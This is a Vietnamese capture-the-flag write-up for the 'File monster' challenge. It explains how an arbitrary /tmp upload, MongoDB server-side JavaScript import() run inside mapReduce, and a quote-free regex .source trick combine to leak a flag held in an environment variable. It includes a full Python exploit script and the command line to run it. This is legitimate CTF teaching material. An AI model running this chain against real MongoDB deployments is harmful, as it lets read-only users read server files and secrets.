---
title: File monster
date: 2026-09-27
ctf: NNS CTF
category: misc
difficulty: hard
tags:
  - MongoDB
  - SSJI
  - NoSQL
---

## Đề bài
The file monster like files and flags.

File: [web_file-monster.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_file-monster.tar.gz)

## Solution
App gồm **Bun** (web, port 3000) + **MongoDB 8.2.10** chạy chung một container, share `/tmp`. Flag chỉ tồn tại trong biến môi trường `process.env.FLAG` — không nằm sẵn trong file nào. Ta được cấp tài khoản Mongo **`viewer:viewer`** *read-only* (port 27017, `bindIp: 0.0.0.0`) để "phân tích DB". Lời giải ghép **4 mắt xích**.

### Bug 1 — `/upload`: ghi file tuỳ ý vào `/tmp` + tự thay FLAG

`src/index.ts` ghi nội dung upload ra `/tmp/<name>` (tên khớp `^[a-zA-Z][a-zA-Z0-9.]*$`), lọc bỏ `"` `'` `` ` `` rồi **thay lần xuất hiện đầu tiên của chuỗi `FLAG`** bằng flag thật:

```ts!
const path = `/tmp/${file.name}`;
// ...
const txt = (await file.text())
  .replaceAll('"', '').replaceAll("'", '').replaceAll('`', '')
  .replace('FLAG', process.env.FLAG ?? 'nns{demo_flag}');   // (!) inject flag
await Bun.write(path, txt);
```

→ Ta tạo được **file không có dấu nháy** trong `/tmp`, và nếu nội dung chứa `FLAG` thì flag thật được nhét thẳng vào file của ta.

### Bug 2 — mongod `import()` = primitive đọc file phía server

`viewer` bị sandbox JS (không `fs`/`env`/`exec`), *nhìn* như bịt kín. Nhưng engine JS server-side của mongod 8.2.10 (SpiderMonkey) **có `import()` hoạt động**: `import('/tmp/x')` khiến chính **mongod `openat()` và nạp file như một ES module**. Vì Bun và mongod chung `/tmp`, mongod đọc được đúng file ta vừa upload — dù chỉ là user read-only.

### Bug 3 — timing: `$function` không drain, `mapReduce` thì có

Trong `$function`, Promise của `import()` **không bao giờ settle** (không có vòng lặp event) → module không eval. Nhưng trong **`mapReduce` chạy trên ≥2 document**, hàng đợi job của JS **được drain giữa các lần gọi `map`**, và `globalThis` được giữ xuyên suốt query. Vậy chạy `import()` từ mapReduce thì module **eval thật**, side-effect lộ ra ở lần `map` thứ 2 trở đi. (Nhớ upload sẵn ≥2 file để collection `files` có ≥2 doc.)

### Bug 4 — exfil không dùng quote bằng regex `.source`

Vì `"`/`'`/`` ` `` bị lọc, không dùng string literal được. Mẹo: **regex literal** — upload module có nội dung:

```js!
globalThis.__LK = (/FLAG/).source
```

Sau khi server thay `FLAG`, nó thành `globalThis.__LK = (/NNS{...}/).source`, mà `.source` của regex literal chính là **chuỗi pattern** — tức toàn bộ flag, không cần một dấu nháy nào. Import module đó từ mapReduce rồi đọc `globalThis.__LK` qua lần drain là có flag.

### Luồng hoàn chỉnh & exploit

```python!
import sys, subprocess, random, string, json
from pymongo import MongoClient
from bson.code import Code

MONGO  = sys.argv[1]   # mongodb://viewer:viewer@<host>:<port>/?authSource=file-monster
UPLOAD = sys.argv[2]   # http(s)://<host>/upload
EXTRA  = sys.argv[3] if len(sys.argv) > 3 else ""   # vd "-k" cho TLS self-signed

db = MongoClient(MONGO, serverSelectionTimeoutMS=15000)["file-monster"]
rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(7))
modname = rnd + ".js"

# regex .source giữ flag dạng text thô, không cần quote
content = "globalThis.__LK_%s=(/FLAG/).source" % rnd
cmd = ["curl", "-s"] + ([EXTRA] if EXTRA else []) + ["-F", "file=@-;filename=%s" % modname, UPLOAD]
print("UPLOAD:", subprocess.run(cmd, input=content.encode(), capture_output=True).stdout.decode()[:200])

# mapReduce trên >=2 doc => job queue drain giữa các lần map; globalThis được giữ
mp = Code("""function(){
  if(typeof globalThis.__d==='undefined'){globalThis.__d=1; globalThis.__o='PENDING';
    import('/tmp/%s').then(
      function(m){ globalThis.__o='OK:'+JSON.stringify(globalThis.__LK_%s); },
      function(e){ globalThis.__o='REJ['+String(e.name)+']:'+String(e.message); });
  }
  emit(NumberInt(Math.floor(Math.random()*1e9)), globalThis.__o);
}""" % (modname, rnd))
rd = Code("function(k,v){return v.join('~~')}")

res = db.command("mapReduce", "files", map=mp, reduce=rd, out={"inline": 1})
for v in {r["value"] for r in res.get("results", [])}:
    if v.startswith("OK:"):
        print("FLAG =>", json.loads(v[3:]))
```

```bash!
python3 exploit.py \
  "mongodb://viewer:viewer@<host>:<port>/?authSource=file-monster&tls=true&tlsAllowInvalidCertificates=true" \
  "https://<host>/upload" -k
```

->Flag: `NNS{60oD_Job_g3ttiN6_7hi5_tas7y_fla6_fr0m_7he_Fla6_m0ns7er}`
